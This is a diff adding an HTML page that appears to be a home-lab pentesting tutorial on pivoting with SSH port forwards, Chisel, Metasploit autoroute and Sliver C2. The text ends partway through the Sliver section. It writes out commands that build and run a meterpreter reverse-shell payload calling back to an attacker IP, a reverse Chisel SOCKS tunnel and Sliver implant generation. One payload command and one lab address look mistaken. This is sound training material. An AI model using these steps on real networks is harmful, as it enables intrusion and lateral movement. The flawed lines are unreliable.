@@ -1,0 +1,774 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Pivoting, PortFwd, and Reverse PortFwd</title>
+<meta name="author" content="Russell Brinson" />
+<meta name="generator" content="Org Mode" />
+<style>
+  #content { max-width: 60em; margin: auto; }
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #e6e6e6;
+    border-radius: 3px;
+    background-color: #f2f2f2;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: auto;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    top: -8px;
+    right: 12px;
+    padding: 3px;
+    color: #555;
+    background-color: #f2f2f299;
+  }
+  pre.src:hover:before { display: inline; margin-top: 14px;}
+  /* Languages per Org manual */
+  pre.src-asymptote:before { content: 'Asymptote'; }
+  pre.src-awk:before { content: 'Awk'; }
+  pre.src-authinfo::before { content: 'Authinfo'; }
+  pre.src-C:before { content: 'C'; }
+  /* pre.src-C++ doesn't work in CSS */
+  pre.src-clojure:before { content: 'Clojure'; }
+  pre.src-css:before { content: 'CSS'; }
+  pre.src-D:before { content: 'D'; }
+  pre.src-ditaa:before { content: 'ditaa'; }
+  pre.src-dot:before { content: 'Graphviz'; }
+  pre.src-calc:before { content: 'Emacs Calc'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-fortran:before { content: 'Fortran'; }
+  pre.src-gnuplot:before { content: 'gnuplot'; }
+  pre.src-haskell:before { content: 'Haskell'; }
+  pre.src-hledger:before { content: 'hledger'; }
+  pre.src-java:before { content: 'Java'; }
+  pre.src-js:before { content: 'Javascript'; }
+  pre.src-latex:before { content: 'LaTeX'; }
+  pre.src-ledger:before { content: 'Ledger'; }
+  pre.src-lisp:before { content: 'Lisp'; }
+  pre.src-lilypond:before { content: 'Lilypond'; }
+  pre.src-lua:before { content: 'Lua'; }
+  pre.src-matlab:before { content: 'MATLAB'; }
+  pre.src-mscgen:before { content: 'Mscgen'; }
+  pre.src-ocaml:before { content: 'Objective Caml'; }
+  pre.src-octave:before { content: 'Octave'; }
+  pre.src-org:before { content: 'Org mode'; }
+  pre.src-oz:before { content: 'OZ'; }
+  pre.src-plantuml:before { content: 'Plantuml'; }
+  pre.src-processing:before { content: 'Processing.js'; }
+  pre.src-python:before { content: 'Python'; }
+  pre.src-R:before { content: 'R'; }
+  pre.src-ruby:before { content: 'Ruby'; }
+  pre.src-sass:before { content: 'Sass'; }
+  pre.src-scheme:before { content: 'Scheme'; }
+  pre.src-screen:before { content: 'Gnu Screen'; }
+  pre.src-sed:before { content: 'Sed'; }
+  pre.src-sh:before { content: 'shell'; }
+  pre.src-sql:before { content: 'SQL'; }
+  pre.src-sqlite:before { content: 'SQLite'; }
+  /* additional languages in org.el's org-babel-load-languages alist */
+  pre.src-forth:before { content: 'Forth'; }
+  pre.src-io:before { content: 'IO'; }
+  pre.src-J:before { content: 'J'; }
+  pre.src-makefile:before { content: 'Makefile'; }
+  pre.src-maxima:before { content: 'Maxima'; }
+  pre.src-perl:before { content: 'Perl'; }
+  pre.src-picolisp:before { content: 'Pico Lisp'; }
+  pre.src-scala:before { content: 'Scala'; }
+  pre.src-shell:before { content: 'Shell Script'; }
+  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
+  /* additional language identifiers per "defun org-babel-execute"
+       in ob-*.el */
+  pre.src-cpp:before  { content: 'C++'; }
+  pre.src-abc:before  { content: 'ABC'; }
+  pre.src-coq:before  { content: 'Coq'; }
+  pre.src-groovy:before  { content: 'Groovy'; }
+  /* additional language identifiers from org-babel-shell-names in
+     ob-shell.el: ob-shell is the only babel language using a lambda to put
+     the execution function name together. */
+  pre.src-bash:before  { content: 'bash'; }
+  pre.src-csh:before  { content: 'csh'; }
+  pre.src-ash:before  { content: 'ash'; }
+  pre.src-dash:before  { content: 'dash'; }
+  pre.src-ksh:before  { content: 'ksh'; }
+  pre.src-mksh:before  { content: 'mksh'; }
+  pre.src-posh:before  { content: 'posh'; }
+  /* Additional Emacs modes also supported by the LaTeX listings package */
+  pre.src-ada:before { content: 'Ada'; }
+  pre.src-asm:before { content: 'Assembler'; }
+  pre.src-caml:before { content: 'Caml'; }
+  pre.src-delphi:before { content: 'Delphi'; }
+  pre.src-html:before { content: 'HTML'; }
+  pre.src-idl:before { content: 'IDL'; }
+  pre.src-mercury:before { content: 'Mercury'; }
+  pre.src-metapost:before { content: 'MetaPost'; }
+  pre.src-modula-2:before { content: 'Modula-2'; }
+  pre.src-pascal:before { content: 'Pascal'; }
+  pre.src-ps:before { content: 'PostScript'; }
+  pre.src-prolog:before { content: 'Prolog'; }
+  pre.src-simula:before { content: 'Simula'; }
+  pre.src-tcl:before { content: 'tcl'; }
+  pre.src-tex:before { content: 'TeX'; }
+  pre.src-plain-tex:before { content: 'Plain TeX'; }
+  pre.src-verilog:before { content: 'Verilog'; }
+  pre.src-vhdl:before { content: 'VHDL'; }
+  pre.src-xml:before { content: 'XML'; }
+  pre.src-nxml:before { content: 'XML'; }
+  /* add a generic configuration mode; LaTeX export needs an additional
+     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
+  pre.src-conf:before { content: 'Configuration File'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .equation-container {
+    display: table;
+    text-align: center;
+    width: 100%;
+  }
+  .equation {
+    vertical-align: middle;
+  }
+  .equation-label {
+    display: table-cell;
+    text-align: right;
+    vertical-align: middle;
+  }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  .org-svg { }
+</style>
+</head>
+<body>
+<div id="content" class="content">
+<h1 class="title">Pivoting, PortFwd, and Reverse PortFwd</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orgc5d0fb2">1. Overview</a>
+<ul>
+<li><a href="#org1080051">1.1. Tools</a></li>
+<li><a href="#org1fe1d24">1.2. Home Lab Setup</a></li>
+</ul>
+</li>
+<li><a href="#org3a52949">2. Proxychains</a>
+<ul>
+<li><a href="#org71607d4">2.1. Proxychains Setup &amp; Config</a></li>
+<li><a href="#org98bf7c4">2.2. FoxyProxy</a></li>
+<li><a href="#org4820a11">2.3. Proxychains Resources</a></li>
+</ul>
+</li>
+<li><a href="#org7a2e9ea">3. SSH Pivots</a>
+<ul>
+<li><a href="#orgc49202d">3.1. Local Port Forward (-L)</a>
+<ul>
+<li><a href="#orgdf4c628">3.1.1. Lab Practice</a></li>
+<li><a href="#org11e10d9">3.1.2. Lab Challenge</a></li>
+</ul>
+</li>
+<li><a href="#org08abc30">3.2. Reverse Port Forward (-R)</a>
+<ul>
+<li><a href="#org6e0d249">3.2.1. Lab Practice</a></li>
+<li><a href="#org4ffee9f">3.2.2. Lab Challenge</a></li>
+</ul>
+</li>
+<li><a href="#org6520c48">3.3. Dynamic Traffic (-D)</a>
+<ul>
+<li><a href="#orgcd26c28">3.3.1. Lab Practice</a></li>
+<li><a href="#org7f41f6a">3.3.2. Lab Challenge</a></li>
+</ul>
+</li>
+<li><a href="#orga3da63d">3.4. Side note, SSH's default help is great, right?</a></li>
+<li><a href="#org4baa526">3.5. SSH Resources</a></li>
+</ul>
+</li>
+<li><a href="#orgd622abf">4. Chisel</a>
+<ul>
+<li><a href="#org5886185">4.1. Lab Practice</a></li>
+<li><a href="#org8e27e10">4.2. Lab Challenge</a></li>
+<li><a href="#org9b6c7fa">4.3. Chisel Resources</a></li>
+</ul>
+</li>
+<li><a href="#org5cd5675">5. Metasploit</a>
+<ul>
+<li><a href="#org682f5a4">5.1. Autoroute</a></li>
+<li><a href="#org61204f5">5.2. Route</a></li>
+<li><a href="#org3e2e200">5.3. Lab Practice</a>
+<ul>
+<li><a href="#org0b61543">5.3.1. Reverse shell running on alpha box</a></li>
+</ul>
+</li>
+<li><a href="#org311102e">5.4. Lab Challenge</a></li>
+<li><a href="#org27cbb66">5.5. Resources</a></li>
+</ul>
+</li>
+<li><a href="#org7d18b02">6. Sliver C2</a>
+<ul>
+<li><a href="#org1886e35">6.1. SOCKS5 Proxy</a></li>
+<li><a href="#org8aac047">6.2. TCP Pivot</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgc5d0fb2" class="outline-2">
+<h2 id="orgc5d0fb2"><span class="section-number-2">1.</span> Overview</h2>
+<div class="outline-text-2" id="text-1">
+</div>
+<div id="outline-container-org1080051" class="outline-3">
+<h3 id="org1080051"><span class="section-number-3">1.1.</span> Tools</h3>
+<div class="outline-text-3" id="text-1-1">
+<ul class="org-ul">
+<li>Proxychains &amp; FoxyProxy</li>
+<li>ssh</li>
+<li>Chisel</li>
+<li>C2 Capabilities
+<ul class="org-ul">
+<li>Metasploit Meterpreter Session</li>
+<li>Cobalt Strike Beacons</li>
+<li>Sliver Impants</li>
+</ul></li>
+<li>Custom tooling</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org1fe1d24" class="outline-3">
+<h3 id="org1fe1d24"><span class="section-number-3">1.2.</span> Home Lab Setup</h3>
+<div class="outline-text-3" id="text-1-2">
+<p>
+Check out the post on it <a href="https://rbrins.github.io/posts/2023-01-24-pivot-lab-setup.html">here</a> for a complete walkthrough. 
+The rough steps are:
+</p>
+<ol class="org-ol">
+<li>Install two ubuntu server VMs</li>
+<li>One of the servers have two NICs, one that your kali box can access and another one that your kali can NOT access</li>
+<li>The other server has one NIC, and that is one that can access the ubuntu server in step 2</li>
+</ol>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org3a52949" class="outline-2">
+<h2 id="org3a52949"><span class="section-number-2">2.</span> Proxychains</h2>
+<div class="outline-text-2" id="text-2">
+<ul class="org-ul">
+<li>Proxychains is a tool for managing and directing tcp connections.</li>
+</ul>
+
+<pre class="example">
+proxychains &lt;normal shell command and its arguements&gt;
+</pre>
+</div>
+
+<div id="outline-container-org71607d4" class="outline-3">
+<h3 id="org71607d4"><span class="section-number-3">2.1.</span> Proxychains Setup &amp; Config</h3>
+<div class="outline-text-3" id="text-2-1">
+<p>
+This is assuming you already have an updated version of kali in your virutal machine manager. If you are using a different linux box it is assumed that you have enough linux knowledge to install proxychains. 
+</p>
+
+<p>
+On kali you can access your proxy chains config with your text editor of choice, for what we are doing vim is plenty fine.
+</p>
+<ul class="org-ul">
+<li>Open the config file with <code>sudo vim /etc/proxychains4.confg</code> (note you may have a slight configuration name difference without the number 4 in the name)</li>
+<li>Towards the end of the file you will see a banner with <code>[ProxyList]</code></li>
+<li>you will need to add a <code>socks5 127.0.0.1 1080</code> line and have it commented out for the time being</li>
+<li>save the file with <code>ESC :wq</code></li>
+<li>then throughout the pivots with proxychains you will comment the <code>socks4</code> line and uncomment the <code>socks5</code> line, and vice versa</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org98bf7c4" class="outline-3">
+<h3 id="org98bf7c4"><span class="section-number-3">2.2.</span> FoxyProxy</h3>
+<div class="outline-text-3" id="text-2-2">
+<ul class="org-ul">
+<li>A plugin for firefox to manage proxy settings easier than going into settings each time you want to toggle proxy for your browser.</li>
+<li>These can be pointed to your socks proxy with <code>localhost</code> and the associated port for socks4 or socks5 to allow for connection to webservers your pivots have access too, seeing the victim's internal web apps like the users would</li>
+<li>It can also be pointed to your burp or zap proxy so that your web browser activity is captured within those tools.</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org4820a11" class="outline-3">
+<h3 id="org4820a11"><span class="section-number-3">2.3.</span> Proxychains Resources</h3>
+<div class="outline-text-3" id="text-2-3">
+<ul class="org-ul">
+<li><a href="https://manpages.ubuntu.com/manpages/bionic/man1/proxychains4.1.html">Ubuntu man page for proxychains4</a></li>
+<li><a href="https://askubuntu.com/questions/1008425/editing-config-on-proxychains-ubuntu-for-windows-linux-sub-system">askUbuntu Finding Proxychains</a></li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org7a2e9ea" class="outline-2">
+<h2 id="org7a2e9ea"><span class="section-number-2">3.</span> SSH Pivots</h2>
+<div class="outline-text-2" id="text-3">
+</div>
+<div id="outline-container-orgc49202d" class="outline-3">
+<h3 id="orgc49202d"><span class="section-number-3">3.1.</span> Local Port Forward (-L)</h3>
+<div class="outline-text-3" id="text-3-1">
+<ul class="org-ul">
+<li>Local PortFwd, assigns local attacker port to a victims (either victim local host or other port open to just the victim) port.</li>
+<li>This could be that your attacker machine will receive some input on Port A with a different network and want to forward that port to the Victim port B.</li>
+<li>In offensive practice this will be rare</li>
+<li>NOTE: <code>&lt;the address of the victim&gt;</code> can be a different machine than the machine being SSH'd into or localhost OF the machine being SSH'd into</li>
+</ul>
+
+<pre class="example">
+ssh -L &lt;local Port of attacker&gt;:&lt;the address of the victim&gt;:&lt;victim Port&gt; &lt;remoteHost connecting&gt;
+</pre>
+</div>
+
+<div id="outline-container-orgdf4c628" class="outline-4">
+<h4 id="orgdf4c628"><span class="section-number-4">3.1.1.</span> Lab Practice</h4>
+<div class="outline-text-4" id="text-3-1-1">
+<ol class="org-ol">
+<li>using beta machine, <code>vagrant ssh</code> then run <code>sudo tcpdump -i enp0s8 port 9999</code></li>
+<li>using attacker machine run <code>ssh -L 8888:172.16.100.13:9999 vagrant@192.168.100.12</code></li>
+<li>using attacker machine, open another terminal, run <code>nc localhost 8888</code></li>
+<li>using beta machine, confirm that <code>tcpdump</code> shows a connection.</li>
+</ol>
+</div>
+</div>
+
+<div id="outline-container-org11e10d9" class="outline-4">
+<h4 id="org11e10d9"><span class="section-number-4">3.1.2.</span> Lab Challenge</h4>
+<div class="outline-text-4" id="text-3-1-2">
+<p>
+Setup a basic webserver on your attacker machine that local port forwards using SSH to a victim port.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org08abc30" class="outline-3">
+<h3 id="org08abc30"><span class="section-number-3">3.2.</span> Reverse Port Forward (-R)</h3>
+<div class="outline-text-3" id="text-3-2">
+<ul class="org-ul">
+<li>Reverse PortFwd, sending traffic from the victim's port to the attacker's tunnel port (great for creating listeners on the other network)</li>
+<li>This will be the victim machine's port listening and sending that data back to your attacker machine</li>
+<li>In offensive practice this can do things like listening on smb ports of linux machines with a tool like responder</li>
+<li>Notes: 
+<ul class="org-ul">
+<li><code>&lt;the address of the recipent&gt;</code> need only to be a computer your attacker has access too, perhaps a server serving payloads</li>
+<li>This <code>victim Port</code> will ONLY listen for connections on its localhost, unless you modify <code>/etc/ssh/sshd_config</code></li>
+</ul></li>
+</ul>
+<pre class="example">
+ssh -R &lt;victim Port&gt;:&lt;the address of the recipent&gt;:&lt;local port&gt; &lt;remoteHost connecting&gt;
+</pre>
+</div>
+
+<div id="outline-container-org6e0d249" class="outline-4">
+<h4 id="org6e0d249"><span class="section-number-4">3.2.1.</span> Lab Practice</h4>
+<div class="outline-text-4" id="text-3-2-1">
+<ol class="org-ol">
+<li>using attacker machine, run <code>nc -lvp 8989</code> this is the port we will send to</li>
+<li>using attacker machine, run <code>ssh -R 7777:localhost:8989 vagrant@192.168.100.12</code></li>
+<li>using alpha machine, <code>vagrant ssh</code> then run <code>nc localhost 7777</code></li>
+<li>using attacker machine, confirm connection</li>
+</ol>
+</div>
+</div>
+
+<div id="outline-container-org4ffee9f" class="outline-4">
+<h4 id="org4ffee9f"><span class="section-number-4">3.2.2.</span> Lab Challenge</h4>
+<div class="outline-text-4" id="text-3-2-2">
+<p>
+Setup responder on your attacker machine to listen to an SMB port on a victim linux machine.
+This will require modifying <code>GatewayPorts</code> to <code>yes</code> in your <code>/etc/ssh/sshd_config</code> of your alpha box.
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-org6520c48" class="outline-3">
+<h3 id="org6520c48"><span class="section-number-3">3.3.</span> Dynamic Traffic (-D)</h3>
+<div class="outline-text-3" id="text-3-3">
+<ul class="org-ul">
+<li>Allows for dynamic traffic to the other network that the victim has access.</li>
+<li>This will be the attacker computer interacting with the network through a victim computer</li>
+<li>Tools can be used through proxychains configuration</li>
+</ul>
+
+<pre class="example">
+ssh -D &lt;proxy port&gt; &lt;remoteHost connection&gt;
+</pre>
+</div>
+
+<div id="outline-container-orgcd26c28" class="outline-4">
+<h4 id="orgcd26c28"><span class="section-number-4">3.3.1.</span> Lab Practice</h4>
+<div class="outline-text-4" id="text-3-3-1">
+<ol class="org-ol">
+<li>using attacker machine, check that <code>/etc/proxychains4.conf</code> contains <code>socks4 127.0.0.1 9050</code> (kali should have by default, if using another attacker box, please install and configure proxychains)</li>
+<li>using attacker machine, run <code>ssh -D 9050 vagrant@10.168.100.12</code></li>
+<li>using attacker machine, run <code>proxychains wget 172.16.100.13</code></li>
+<li>using attacker machine, confirm default apache index file was downloaded from beta machine</li>
+</ol>
+</div>
+</div>
+
+<div id="outline-container-org7f41f6a" class="outline-4">
+<h4 id="org7f41f6a"><span class="section-number-4">3.3.2.</span> Lab Challenge</h4>
+<div class="outline-text-4" id="text-3-3-2">
+<p>
+Run nmap with various port scans and options using the beta machine <code>nc</code> to open ports for confirmation and study the option compared to expected output.
+hint: start with a single port as proxychains is slow
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orga3da63d" class="outline-3">
+<h3 id="orga3da63d"><span class="section-number-3">3.4.</span> Side note, SSH's default help is great, right?</h3>
+<div class="outline-text-3" id="text-3-4">
+<pre class="example">
+ssh -L       
+option requires an argument -- L
+usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]
+	   [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]
+	   [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]
+	   [-i identity_file] [-J [user@]host[:port]] [-L address]
+	   [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]
+	   [-Q query_option] [-R address] [-S ctl_path] [-W host:port]
+	   [-w local_tun[:remote_tun]] destination [command [argument ...]]
+
+</pre>
+<p>
+thanks, ssh
+</p>
+</div>
+</div>
+
+<div id="outline-container-org4baa526" class="outline-3">
+<h3 id="org4baa526"><span class="section-number-3">3.5.</span> SSH Resources</h3>
+<div class="outline-text-3" id="text-3-5">
+<ul class="org-ul">
+<li><a href="https://pswalia2u.medium.com/ssh-tunneling-port-forwarding-pivoting-socks-proxy-85fb7129912d">n00 article on SSH Tunneling, port forwarding, pivoting, socks proxy</a></li>
+<li><a href="https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot">Stackexchange What is SSH port forwarding</a></li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgd622abf" class="outline-2">
+<h2 id="orgd622abf"><span class="section-number-2">4.</span> Chisel</h2>
+<div class="outline-text-2" id="text-4">
+<ul class="org-ul">
+<li>Uses a client / server model to tunnel, transported over HTTP, and secured via SSH.</li>
+<li>It is a single executable for both client and server written in Go for great cross-complilation.</li>
+<li>In practice, chisel is mainly a tool used when SSH pivoting can't be used, like on windows boxes</li>
+<li>As we start reverse connections, if you see not response on your attacker listener, then it is most likely a virtual network issue. Ensure you have the proper virtual network adapter.</li>
+</ul>
+<p>
+<a href="https://github.com/jpillora/chisel/releases/">Latest Releases Executables</a>
+</p>
+
+<p>
+<b>Attack configuration - Reverse Tunnel</b>
+</p>
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="org-left" />
+
+<col  class="org-left" />
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">Machine</th>
+<th scope="col" class="org-left">Chisel or Proxychains Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">Attacker</td>
+<td class="org-left"><code>./chisel server -p &lt;desired.port&gt; --reverse</code></td>
+</tr>
+
+<tr>
+<td class="org-left">Victim</td>
+<td class="org-left"><code>./chisel client &lt;attack.ip&gt;:&lt;attack.port&gt; R:&lt;desired.reverse.port&gt;:socks</code></td>
+</tr>
+
+<tr>
+<td class="org-left">Attacker</td>
+<td class="org-left">edit <code>/etc/proxychains4.conf</code> and add <code>socks5 127.0.0.1 &lt;desired.reverse.port&gt;</code></td>
+</tr>
+
+<tr>
+<td class="org-left">Attacker</td>
+<td class="org-left"><code>proxychains &lt;command&gt;</code></td>
+</tr>
+
+<tr>
+<td class="org-left">&#xa0;</td>
+<td class="org-left">&#xa0;</td>
+</tr>
+
+<tr>
+<td class="org-left">&#xa0;</td>
+<td class="org-left">&#xa0;</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+<div id="outline-container-org5886185" class="outline-3">
+<h3 id="org5886185"><span class="section-number-3">4.1.</span> Lab Practice</h3>
+<div class="outline-text-3" id="text-4-1">
+<ol class="org-ol">
+<li>Using attacker machine, Download chisel latest release for amd64 linux and unzip (<code>gzip -d &lt;filename.gz&gt;</code>)</li>
+<li>Using attacker machine, host the chisel file (change into <code>~/Downloads</code> then run <code>python -m http.server</code> to host a simple http server)</li>
+<li>Using attacker machine, edit <code>/etc/proxychains4.conf</code> and add <code>socks5 127.0.0.1 1080</code></li>
+<li>Using attacker machine, run <code>ssh vagrant@192.168.100.12</code></li>
+<li>Using attacker machine, run <code>scp &lt;path to chiselFileName&gt; vagrant@192.168.100.12:chisel</code></li>
+<li>Using attacker machine, run <code>&lt;chiselExecutable&gt; server -p 8000 --reverse</code></li>
+<li>Using alpha machine, run <code>./chisel client &lt;your attacker ip&gt;:8000 R:socks</code></li>
+<li>Using attacker machine, run <code>proxychains wget http://172.16.100.13/</code></li>
+<li>Using attacker machine, confirm default apache index file was downloaded from beta machine</li>
+</ol>
+</div>
+</div>
+
+<div id="outline-container-org8e27e10" class="outline-3">
+<h3 id="org8e27e10"><span class="section-number-3">4.2.</span> Lab Challenge</h3>
+<div class="outline-text-3" id="text-4-2">
+<p>
+Setup a windows box in virtualbox with <code>192.168.100.20</code> &amp; <code>172.16.100.20</code> and on those networks. Then using the gui for the windows box and your attacker machine, setup the same chisel as above and <code>wget</code> from the beta box.
+Hint: ensure you also download the correct windows binary from the latest releases.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org9b6c7fa" class="outline-3">
+<h3 id="org9b6c7fa"><span class="section-number-3">4.3.</span> Chisel Resources</h3>
+<div class="outline-text-3" id="text-4-3">
+<ul class="org-ul">
+<li><a href="https://ap3x.github.io/posts/pivoting-with-chisel/">Ap3x Security - Pivoting with Chisel</a></li>
+<li><a href="https://github.com/jpillora/chisel">Chisel Github</a></li>
+<li><a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">0xdf with tunneling with chisel</a></li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org5cd5675" class="outline-2">
+<h2 id="org5cd5675"><span class="section-number-2">5.</span> Metasploit</h2>
+<div class="outline-text-2" id="text-5">
+<ul class="org-ul">
+<li>If you are already using c2s for communication and session management then pivoting is build right into some.</li>
+<li>With metasploit, <code>msfconsole</code> can attempt to automatically add the routes for you when you call the <code>post/multi/manage/autoroute</code> when you have a meterpreter payload</li>
+<li>Note: This can be used as a SOCKS proxy like the pivoting above to run your own tooling through <code>proxychains</code> or can be used to run another metasploit module for more flexibility.</li>
+</ul>
+</div>
+
+<div id="outline-container-org682f5a4" class="outline-3">
+<h3 id="org682f5a4"><span class="section-number-3">5.1.</span> Autoroute</h3>
+<div class="outline-text-3" id="text-5-1">
+<pre class="example">
+background
+use post/multi/manage/autoroute
+set SESSION &lt;session number&gt;
+run
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org61204f5" class="outline-3">
+<h3 id="org61204f5"><span class="section-number-3">5.2.</span> Route</h3>
+<div class="outline-text-3" id="text-5-2">
+<pre class="example">
+route add &lt;IP ADDRESS OF SUBNET&gt; &lt;NETMASK&gt; &lt;GATEWAY&gt;
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org3e2e200" class="outline-3">
+<h3 id="org3e2e200"><span class="section-number-3">5.3.</span> Lab Practice</h3>
+<div class="outline-text-3" id="text-5-3">
+</div>
+<div id="outline-container-org0b61543" class="outline-4">
+<h4 id="org0b61543"><span class="section-number-4">5.3.1.</span> Reverse shell running on alpha box</h4>
+<div class="outline-text-4" id="text-5-3-1">
+<p>
+Since this is a c2 framework, we need to already have a payload executed. Normally this would be done through exploiting a vulnerable application/service or some sort of social engineering. Since this practice is all about getting the pivot to work, we are going to create, upload, and execute a payload directly on alpha box; Allowing us to skip the need for some sort of exploitation.
+</p>
+<ol class="org-ol">
+<li>Using attacker machine, run <code>msfconsole -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.100.5 LPORT=4444 -f elf &gt; shellx64</code></li>
+<li>Using attacker machine, run <code>scp ./shellx64 vagrant@192.168.100.12:/home/vagrant/shellx64</code></li>
+<li>Using attacker machine, run <code>sudo msfconsole</code></li>
+<li>Using attacker machine, within msfconsole, run <code>use exploit/multi/handler</code></li>
+<li>Using attacker machine, within msfconsole, set the following parameters</li>
+</ol>
+<pre class="example">
+set payload linux/x64/meterpreter_reverse_tcp
+set LHOST 192.168.100.5
+set LPORT 4444
+</pre>
+<ol class="org-ol">
+<li>Using attacker machine, within msfconsole, run <code>run</code></li>
+<li>Using alpha box, <code>SSH</code> into the box and run <code>chmod +x ./shellx64</code>, then execute with <code>./shellx64</code></li>
+<li>Using attacker msfconsole, confirm meterpreter session, then run <code>background</code> to return to msfconsole</li>
+<li>Using attacker msfconsole, run <code>use post/multi/manage/autoroute</code></li>
+<li>Using attacker msfconsole, set the following parameters</li>
+</ol>
+<pre class="example">
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+</pre>
+<ol class="org-ol">
+<li>Using attacker msfconsole, run <code>run</code></li>
+<li>Using attacker msfconsole, confirm route added <code>[+] Route added to subnet 172.16.100.0</code></li>
+<li>Using attacker machine, using a separate terminal run <code>proxychains wget http://172.16.100.13</code></li>
+</ol>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-org311102e" class="outline-3">
+<h3 id="org311102e"><span class="section-number-3">5.4.</span> Lab Challenge</h3>
+<div class="outline-text-3" id="text-5-4">
+<p>
+Setup a vulnderable web app (something that metasploit has a module for) on the beta box, then you metasploit to pivot through alpha box to attack and exploit beta box.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org27cbb66" class="outline-3">
+<h3 id="org27cbb66"><span class="section-number-3">5.5.</span> Resources</h3>
+<div class="outline-text-3" id="text-5-5">
+<ul class="org-ul">
+<li><a href="https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html">Metasploit documentation on pivoting</a></li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org7d18b02" class="outline-2">
+<h2 id="org7d18b02"><span class="section-number-2">6.</span> Sliver C2</h2>
+<div class="outline-text-2" id="text-6">
+<ul class="org-ul">
+<li>Sliver C2 is a C2 framework created by Bishop Fox.</li>
+<li>Used the blog I wrote on <a href="https://rbrins.github.io/posts/2023-01-25-ansible-learnings.html">learning Ansible by setting up a Sliver server</a>.</li>
+<li>Connected from my kali machine to the Sliver server using the operator configuration generated from the step above.</li>
+<li>Encountered some issues on generating a linux binary for execution (didn't have a problem generating a windows binary).
+<ul class="org-ul">
+<li><code>[!] rpc error: code = Unknown desc = exit status 1</code></li>
+<li>I think it is something to do with DNS, which means I'm probably going down the dns in my lab rabbit hole.</li>
+<li>Nope, issue seemed to be that I just didn't set the <code>--arch amd64</code> when I was generating the shell.</li>
+</ul></li>
+<li>Generated a shell from the operator console <code>generate --mtls 172.16.100.12 --os linux --arch amd64</code></li>
+</ul>
+
+<p>
